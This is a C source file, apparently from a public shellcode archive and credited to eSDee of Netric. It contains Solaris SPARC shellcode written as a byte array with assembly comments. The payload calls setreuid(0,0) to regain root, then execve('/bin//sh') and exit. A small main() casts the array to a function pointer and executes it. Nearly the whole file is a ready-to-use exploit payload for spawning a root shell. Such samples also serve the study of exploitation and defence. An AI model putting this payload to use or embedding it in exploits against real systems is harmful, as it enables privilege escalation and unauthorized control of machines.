/* Solaris sparc shellcode by eSDee of Netric (www.netric.org)
 * setreuid(0,0); execve("/bin//sh", &argv[0], NULL); exit();
 */

#include <stdio.h>

char
shellcode[]=

   // setreuid(0,0); 
        
  "\x90\x1d\x80\x16"  // xor  %l6, %l6, %o0
  "\x92\x1d\x80\x16"  // xor  %l6, %l6, %o1
  "\x82\x10\x20\xca"  // mov  0xca, %g1
  "\x91\xd0\x20\x08"  // ta  8

  // execve("/bin//sh", &argv[0], NULL);
  
  "\x21\x0b\xd8\x9a"  // sethi  %hi(0x2f626800), %l0
  "\xa0\x14\x21\x6e"  // or  %l0, 0x16e, %l0     ! 0x2f62696e
  "\x23\x0b\xcb\xdc"  // sethi  %hi(0x2f2f7000), %l1
  "\xa2\x14\x63\x68"  // or  %l1, 0x368, %l1     ! 0x2f2f7368
  "\xe0\x3b\xbf\xf0"  // std  %l0, [ %sp + -16 ] 
  "\xc0\x23\xbf\xf8"  // clr  [ %sp + -8 ]
  "\x90\x23\xa0\x10"  // sub  %sp, 0x10, %o0
  "\xc0\x23\xbf\xec"  // clr  [ %sp + -20 ]
  "\xd0\x23\xbf\xe8"  // st  %o0, [ %sp + -24 ]
  "\x92\x23\xa0\x18"  // sub  %sp, 0x18, %o1
  "\x94\x22\x80\x0a"  // sub  %o2, %o2, %o2
  "\x82\x10\x20\x3b"  // mov  0x3b, %g1
  "\x91\xd0\x20\x08"  // ta  8
  
  // exit()
  
  "\x82\x10\x20\x01"  // mov  1, %g1
  "\x91\xd0\x20\x08";  // ta  8


int
main()
{
        void (*funct) ();
        (long) funct = &shellcode;
        funct();
}